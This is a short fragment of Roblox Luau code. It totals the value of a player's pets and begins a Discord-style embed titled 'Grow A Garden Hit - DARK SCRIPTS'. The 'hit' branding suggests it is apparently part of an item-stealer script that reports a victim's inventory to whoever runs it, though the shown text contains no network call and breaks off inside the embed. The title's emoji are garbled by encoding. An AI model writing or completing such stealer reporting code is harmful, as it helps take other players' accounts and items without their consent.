for _, pet in ipairs(pets) do
    totalValue += pet.Value or 0
end
local formattedTotalValue = formatNumberWithCommas(totalValue)

if petString ~= "" then
    local embed = {
        title = "ðŸŒµ Grow A Garden Hit - DARK SCRIPTS ðŸ€",
        color = 65280,
        fields = {
